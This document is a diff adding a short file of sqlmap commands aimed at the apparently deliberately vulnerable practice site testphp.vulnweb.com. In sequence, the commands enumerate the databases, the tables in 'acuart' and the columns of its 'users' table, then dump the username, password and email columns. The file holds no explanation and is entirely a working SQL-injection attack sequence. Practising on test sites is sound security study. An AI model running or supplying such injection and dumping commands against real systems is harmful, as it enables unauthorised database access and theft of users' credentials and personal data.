@@ -1,0 +1,6 @@
+sqlmap -u testphp.vulnweb.com/artist.php?artists=1 -dbs
+sqlmap -u testphp.vulnweb.com/artist.php?artists=1 -D acuart --tables
+sqlmap -u testphp.vulnweb.com/artist.php?artists=1 -D acuart -T users --columns
+sqlmap -u testphp.vulnweb.com/artist.php?artists=1 -D acuart -T users -C uname --dump
+sqlmap -u testphp.vulnweb.com/artist.php?artists=1 -D acuart -T users -C pass --dump
+sqlmap -u testphp.vulnweb.com/artist.php?artists=1 -D acuart -T users -C email --dump
